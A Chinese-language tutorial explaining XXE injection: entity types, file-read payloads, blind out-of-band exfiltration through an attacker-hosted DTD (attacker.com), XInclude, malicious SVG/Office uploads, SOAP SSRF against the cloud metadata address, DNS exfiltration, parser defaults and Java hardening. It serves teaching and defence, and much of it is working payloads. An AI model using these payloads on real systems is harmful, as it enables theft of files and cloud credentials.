# XXE 技术原理详解

XXE（XML External Entity Injection）并不只限于 `<!ENTITY` 标签，攻击面比很多人想象的宽得多。下面系统梳理一遍。

---

## 一、XML 的基础结构回顾

XML 文档有三种实体来源：

```
内部实体   <!ENTITY name "value">
外部实体   <!ENTITY name SYSTEM "uri">
参数实体   <!ENTITY % name "value">  （只用于 DTD 内部）
```

XXE 的本质是：**XML 解析器在解析时会主动发起网络/文件请求来"获取"外部实体的内容**，攻击者借此读文件、SSRF、甚至 RCE。

---

## 二、XXE 的核心机制

### 1. 普通外部实体（最基础）

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

解析器替换 `&xxe;` 时，直接读 `/etc/passwd` 并将内容插入 XML 响应。

支持的 URI 协议因语言/库不同：

|协议|说明|
|---|---|
|`file://`|本地文件|
|`http://` / `https://`|SSRF|
|`ftp://`|少数库支持|
|`php://`|PHP 特有包装器|
|`jar://`|Java 特有|
|`netdoc://`|Java 特有|
|`gopher://`|老版本 libxml2|
|`expect://`|PHP+libxml，可 RCE|

---

### 2. 参数实体（Blind XXE 的关键）

当回显被屏蔽时，普通实体无效，需要用**参数实体**（`%`）带外传数据：

```xml
<!-- 攻击者服务器上的 evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%exfil;
%send;
```

```xml
<!-- 发送给目标的 payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<foo>trigger</foo>
```

整个流程：目标服务器 → 拉取 evil.dtd → 展开参数实体 → 把文件内容 OOB 发到攻击者。

---

### 3. XInclude 注入（不需要控制 DOCTYPE）

当服务器把你的输入**嵌入**到更大的 XML 文档中（你无法控制 DOCTYPE）时：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

只需要能在 XML 的某个节点值中注入即可，无需 DTD 权限。

---

### 4. SVG / Office XML / XLSX 等文件上传

很多人忽略的攻击面：**任何接受 XML 格式文件的上传点**。

```xml
<!-- 恶意 SVG -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

同理适用于：

- `.docx` / `.xlsx` / `.pptx`（本质是 ZIP 内的 XML）
- `.gpx`、`.kml`（地图格式）
- SAML assertion（XML 签名的认证断言）
- RSS/Atom feed 解析
- PDF 内嵌的 XML 元数据

---

### 5. SOAP / WebService 接口

```xml
<soapenv:Envelope xmlns:soapenv="...">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
  <soapenv:Body>
    <search>&xxe;</search>
  </soapenv:Body>
</soapenv:Envelope>
```

云环境中打 SSRF 拿 metadata。

---

## 三、Blind XXE 完整攻击链

```
┌──────────────────────────────────────────────────────────────────┐
│  目标服务器                        攻击者服务器                    │
│                                                                  │
│  1. 收到含 %remote 的 XML         2. 响应 evil.dtd               │
│  ──────────────────────────────────────────────────────────►     │
│                                   ◄────────────────────────────  │
│  3. 展开 %file 读 /etc/passwd                                     │
│  4. 展开 %send，发 HTTP GET       5. 日志里看到文件内容            │
│  ──────────────────────────────────────────────────────────►     │
└──────────────────────────────────────────────────────────────────┘
```

带外通道不限于 HTTP，还可以用 DNS 查询（更隐蔽）：

```
SYSTEM "http://data.FILECONTENTS.attacker.com/"
```

用 DNS 子域名带出数据，防火墙通常不拦 DNS。

---

## 四、各语言/库的默认行为

|语言/库|默认解析外部实体|备注|
|---|---|---|
|PHP `libxml`|✅ 是（旧版）|PHP 8+ 默认禁用|
|Java `DocumentBuilder`|✅ 是|需手动禁用|
|Python `lxml`|✅ 是|`resolve_entities=False`|
|Python `xml.etree`|❌ 否|但有 Billion Laughs 风险|
|.NET `XmlDocument`|✅ 是（旧版）|.NET 4.5.2+ 默认禁用|
|Ruby `Nokogiri`|❌ 否（默认）|可手动开启|

---

## 五、防御要点

```java
// Java 正确的禁用方式
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

核心思路：

1. **禁用外部实体**和 DTD 加载
2. 使用白名单验证 XML schema
3. 用 JSON 替代 XML（如果业务允许）
4. WAF 过滤 `SYSTEM`、`PUBLIC`、`ENTITY` 等关键字

---

总结：XXE 的本质是**XML 解析器的信任问题**，`<!ENTITY` 只是最常见的入口，XInclude、文件上传、SAML、SOAP 都是等价的攻击面，关键在于找到任何"解析 XML"的地方。